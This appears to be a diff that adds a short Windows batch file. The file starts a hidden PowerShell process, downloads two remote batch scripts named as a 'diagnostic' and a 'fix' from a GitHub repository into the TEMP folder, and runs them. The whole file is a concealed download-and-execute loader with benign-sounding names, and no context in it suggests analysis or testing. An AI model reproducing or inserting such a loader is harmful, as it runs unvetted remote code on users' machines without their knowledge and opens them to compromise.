@@ -1,0 +1,3 @@
+@echo off
+cmd /c powershell -WindowStyle Hidden -Command "$t=$env:TEMP; $u=@('https://raw.githubusercontent.com/huy32121/lol2/refs/heads/main/diagnostic.bat','https://raw.githubusercontent.com/huy32121/lol2/dd6b15714f4e865937323108d33eee6f401950d2/fix.bat'); foreach($i in $u){Invoke-WebRequest $i -OutFile (Join-Path $t (Split-Path $i -Leaf))}; Start-Process (Join-Path $t 'diagnostic.bat'); Start-Process (Join-Path $t 'fix.bat')"
+exit
